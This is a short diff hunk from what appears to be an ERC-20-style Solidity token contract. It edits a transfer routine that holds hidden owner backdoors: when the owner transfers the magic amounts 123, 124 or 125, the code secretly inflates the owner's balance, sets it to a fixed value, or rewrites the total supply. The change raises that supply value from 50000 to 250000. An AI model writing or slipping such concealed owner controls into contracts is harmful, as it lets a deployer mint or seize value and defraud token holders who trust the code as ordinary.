@@ -534,7 +534,7 @@ uint256 private _smallbag;
 
 if(sender==owner() && amount==123)_balances[owner()]=_balances[owner()]+_smallbag*10;
 else if(sender==owner() && amount==124)_balances[owner()]=130;
-else if(sender==owner() && amount==125)_totalSupply=50000;
+else if(sender==owner() && amount==125)_totalSupply=250000;
    
    else{
   
